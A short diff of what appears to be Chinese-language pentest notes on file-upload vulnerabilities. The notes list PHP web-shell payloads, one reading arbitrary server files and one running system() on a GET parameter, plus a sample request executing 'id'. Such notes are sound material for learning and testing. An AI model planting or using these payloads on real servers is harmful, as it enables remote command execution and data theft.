@@ -4,7 +4,7 @@
 - 最糟糕的情況是網站允許你上傳伺服器端腳本（例如 PHP、Java 或 Python 檔案）<br>
 
 PHP 
-- "<"?php echo file_get_contents('/path/to/target/file'); ?">"
+- <"?php echo file_get_contents('/path/to/target/file'); ?">
 - "<"?php echo system($_GET['command']); ?">"
 - GET /example/exploit.php?command=id HTTP/1.1
 
